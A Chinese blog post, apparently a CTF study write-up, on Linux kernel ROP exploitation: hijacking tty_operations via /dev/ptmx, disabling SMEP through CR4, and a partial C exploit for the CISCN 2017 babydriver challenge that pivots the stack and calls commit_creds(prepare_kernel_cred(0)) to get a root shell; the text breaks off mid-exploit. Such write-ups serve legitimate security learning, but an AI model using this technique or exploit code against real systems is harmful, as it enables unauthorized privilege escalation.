    <content type="html"><![CDATA[<p>前面只找到qwb的题目，这次突然又看到安全客上“Kernel Pwn 学习之路（二）”有蛮多以往的ROP赛题，算是再补充一下。</p><a id="more"></a><h1 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h1><h2 id="tty-struct结构体"><a href="#tty-struct结构体" class="headerlink" title="tty_struct结构体"></a>tty_struct结构体</h2><p>由于<code>ptmx</code>是众多tty设备中的一种，当<code>open(&quot;/dev/ptmx&quot;, O_RDWR);</code>打开的时候，会分配一个<code>tty_struct</code>。<br><br><code>tty_struct</code>结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> ctrl_lock;</span><br><span class="line">    <span class="keyword">spinlock_t</span> flow_lock;</span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>    <span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>       <span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>     <span class="comment">/* winsize_mutex */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stopped:<span class="number">1</span>,    <span class="comment">/* flow_lock */</span></span><br><span class="line">              flow_stopped:<span class="number">1</span>,</span><br><span class="line">              unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> hw_stopped;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ctrl_status:<span class="number">8</span>,    <span class="comment">/* ctrl_lock */</span></span><br><span class="line">              packet:<span class="number">1</span>,</span><br><span class="line">              unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> receive_room;  <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="keyword">int</span> flow_change;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *disc_data;</span><br><span class="line">    <span class="keyword">void</span> *driver_data;</span><br><span class="line">    <span class="keyword">spinlock_t</span> files_lock;      <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line">    <span class="keyword">int</span> closing;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *write_buf;</span><br><span class="line">    <span class="keyword">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>注意到结构体中有个成员<code>const struct tty_operations *ops;</code>，这个<code>tty_operations</code>结构体的定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="title">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="title">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*<span class="built_in">remove</span>)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*<span class="built_in">open</span>)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*<span class="built_in">close</span>)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*<span class="built_in">shutdown</span>)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*<span class="built_in">write</span>)(struct tty_struct * tty,</span><br><span class="line">              <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">    <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*<span class="built_in">stop</span>)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">clear</span>);</span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">                struct serial_icounter_struct *icount);</span><br><span class="line">    <span class="keyword">void</span> (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> <span class="built_in">line</span>, <span class="keyword">char</span> *options);</span><br><span class="line">    <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> <span class="built_in">line</span>);</span><br><span class="line">    <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> <span class="built_in">line</span>, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> (*proc_show)(struct seq_file *, <span class="keyword">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>可以看到有大量的函数指针可用。<br><br>因此利用<code>tty_struct</code>结构体的思路就是劫持这个<code>tty_operations</code>结构体，覆盖相应的函数指针，达到控制程序流的目的。而通常情况下，会选择<code>int  (*ioctl)(struct tty_struct *tty, unsigned int cmd, unsigned long arg);</code>这个函数指针。<br><br>而且由于<code>ptmx</code>设备打开时，分配<code>tty_struct</code>结构体也是通过<code>slub</code>分配器分配的，所以控制起来就比较方便了。</p><h2 id="bypass-smep"><a href="#bypass-smep" class="headerlink" title="bypass smep"></a>bypass smep</h2><p>系统判断是否开启smep保护，是根据<code>CR4</code>寄存器的第二十位bit来确定的，如果是1则为保护开启状态，否则为0。<br><img src="/2020/05/13/kernel-pwn-ROP%EF%BC%88%E7%BB%AD%EF%BC%89/smep.jpg" alt><br>因此要bypass smep，就需要将<code>CR4</code>的第二十个bit置位为0，主要是通过从<code>vmlinux</code>提取出gadgets，通过<code>mov cr4, xxxxx</code>来完成。<br>为了保持再关闭smep后，其他标志位不变或者即使变化也不会影响后续操作系统的正常运行，<code>CR4</code>的修改可分为两种思路:</p><ol><li>通过kernel crash获取<code>CR4</code>的值（可以通过<code>kfree</code>一块非法内存，比如x86下<code>kfree(0xFFFFFFFF)</code>），然后将第二十个bit置0后，再通过gadget<code>mov</code>到<code>CR4</code>中。</li><li>或者用固定值0x6F0，即<code>mov cr4, 0x6f0</code>。<br>而至于gadget的提取，若题目给了<code>vmlinux</code>，可以直接用<code>ROPgadget</code>或者<code>ropper</code>提取，若没有，则可以通过<a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux" target="_blank" rel="noopener"><code>extract-vmlinux</code></a>从内核镜像<code>bzImage</code>中提取<code>vmlinux</code>：<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> SPDX-License-Identifier: GPL-2.0-only</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ----------------------------------------------------------------------</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Inspired from extract-ikconfig</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> (c) 2009,2010 Dick Streefland &lt;dick@streefland.net&gt;</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com&gt;</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">check_vmlinux()</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#</span><span class="bash"> Use readelf to check <span class="keyword">if</span> it<span class="string">'s a valid ELF</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> TODO: find a better to way to check that it<span class="string">'s really vmlinux</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">       and not just an elf</span></span><br><span class="line">readelf -h $1 &gt; /dev/null 2&gt;&amp;1 || return 1</span><br><span class="line"></span><br><span class="line">cat $1</span><br><span class="line">exit 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try_decompress()</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#</span><span class="bash"> The obscure use of the <span class="string">"tr"</span> filter is to work around older versions of</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="string">"grep"</span> that report the byte offset of the line instead of the pattern.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Try to find the header (<span class="variable">$1</span>) and decompress from here</span></span><br><span class="line">forpos in `tr "$1\n$2" "\n$2=" &lt; "$img" | grep -abo "^$2"`</span><br><span class="line">do</span><br><span class="line">pos=$&#123;pos%%:*&#125;</span><br><span class="line">tail -c+$pos "$img" | $3 &gt; $tmp 2&gt; /dev/null</span><br><span class="line">check_vmlinux $tmp</span><br><span class="line">done</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Check invocation:</span></span><br><span class="line">me=$&#123;0##*/&#125;</span><br><span class="line">img=$1</span><br><span class="line">if[ $# -ne 1 -o ! -s "$img" ]</span><br><span class="line">then</span><br><span class="line">echo "Usage: $me &lt;kernel-image&gt;" &gt;&amp;2</span><br><span class="line">exit 2</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Prepare temp files:</span></span><br><span class="line">tmp=$(mktemp /tmp/vmlinux-XXX)</span><br><span class="line">trap "rm -f $tmp" 0</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> That didn<span class="string">'t work, so retry after decompression.</span></span></span><br><span class="line">try_decompress '\037\213\010' xy    gunzip</span><br><span class="line">try_decompress '\3757zXZ\000' abcde unxz</span><br><span class="line">try_decompress 'BZh'          xy    bunzip2</span><br><span class="line">try_decompress '\135\0\0\0'   xxx   unlzma</span><br><span class="line">try_decompress '\211\114\132' xy    'lzop -d'</span><br><span class="line">try_decompress '\002!L\030'   xxx   'lz4 -d'</span><br><span class="line">try_decompress '(\265/\375'   xxx   unzstd</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Finally check <span class="keyword">for</span> uncompressed images or objects:</span></span><br><span class="line">check_vmlinux $img</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Bail out:</span></span><br><span class="line">echo "$me: Cannot find vmlinux." &gt;&amp;2</span><br></pre></td></tr></table></figure></li></ol><h1 id="ciscn-2017-babydriver复现（ROP做法）"><a href="#ciscn-2017-babydriver复现（ROP做法）" class="headerlink" title="ciscn 2017 babydriver复现（ROP做法）"></a>ciscn 2017 babydriver复现（ROP做法）</h1><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>之前已经分析过了，就不再描述了。要注意的是没有开kaslr。</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>在<code>open</code>设备<code>ptmx</code>之后，利用UAF劫持<code>ptmx</code>设备的<code>tty_struct</code>结构体，修改其中<code>tty_operations</code>的指针指向伪造的表。</li><li>伪造表的<code>ioctl</code>函数指针改为gadget<code>xchg eax, esp; ret;</code>，从而达成stack pivot。因为此时eax正好是<code>xchg eax, esp; ret;</code>的地址的低4 bytes，所以在kaslr关闭的情况下是确定的。因为栈地址要对齐0x8，因此该gadget的地址也要对齐0x8，否则会crash（亲测）。而且注意这里执行<code>xchg eax, esp</code>的时候，实际上<code>rax</code>和<code>rsp</code>的高4 bytes都不是0，但是结果是两者都变成了0，也就是说<code>rsp</code>变成了<code>0x00000000xxxxxxxx</code>，具体原因可以参考(stackoverflow)[<a href="https://stackoverflow.com/questions/11177137/why-do-x86-64-instructions-on-32-bit-registers-zero-the-upper-part-of-the-full-6?tdsourcetag=s_pctim_aiomsg]。" target="_blank" rel="noopener">https://stackoverflow.com/questions/11177137/why-do-x86-64-instructions-on-32-bit-registers-zero-the-upper-part-of-the-full-6?tdsourcetag=s_pctim_aiomsg]。</a></li><li>调用<code>mmap</code>在<code>eax</code>指向的空间分配一块内存，在其中布置rop chain，依次完成<code>CR4</code>的修改，提权，状态切换，起shell的操作。 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">+----------------+ </span><br><span class="line">|     pop_rdi    |</span><br><span class="line">+----------------+</span><br><span class="line">|      0x6f0     |</span><br><span class="line">+----------------+</span><br><span class="line">|   mov_cr4_rdi  |  &#x3D;&#x3D;&gt; mov cr4, rdi; pop rbp; ret;</span><br><span class="line">+----------------+</span><br><span class="line">|      fill      |</span><br><span class="line">+----------------+</span><br><span class="line">|   priviledge   |  &#x3D;&#x3D;&gt; commit_creds(perpare_kernel_cred(0));</span><br><span class="line">+----------------+</span><br><span class="line">|     swapgs     |  &#x3D;&#x3D;&gt; swapgs; pop rbp; ret;</span><br><span class="line">+----------------+</span><br><span class="line">|      fill      |</span><br><span class="line">+----------------+</span><br><span class="line">|      iret      |  &#x3D;&#x3D;&gt; iret</span><br><span class="line">+----------------+</span><br><span class="line">|    getshell    |  &#x3D;&#x3D;&gt; system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">+----------------+</span><br><span class="line">|    user_cs     |</span><br><span class="line">+----------------+</span><br><span class="line">|   user_rflags  |</span><br><span class="line">+----------------+</span><br><span class="line">|    user_sp     |</span><br><span class="line">+----------------+</span><br><span class="line">|    user_ss     |</span><br><span class="line">+----------------+</span><br></pre></td></tr></table></figure></li><li>调用<code>ptmx</code>的<code>ioctl</code>，劫持控制流，逐步触发stack pivor和rop chain，get root shell。</li></ol><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COM_MALLOC 0x10001</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">"mov user_cs, cs;"</span></span><br><span class="line">            <span class="string">"mov user_ss, ss;"</span></span><br><span class="line">            <span class="string">"mov user_sp, rsp;"</span></span><br><span class="line">            <span class="string">"pushf;"</span></span><br><span class="line">            <span class="string">"pop user_rflags;"</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] Status has been saved.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff810a1810</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0xffffffff810a1420</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">priviledge_escalation</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *(*pkc)(<span class="keyword">void</span> *) = (<span class="keyword">void</span> *)prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">int</span> (*cc)(<span class="keyword">void</span> *) = (<span class="keyword">void</span> *)commit_creds;</span><br><span class="line"></span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[+] Root!\n"</span>);</span><br><span class="line">        system(<span 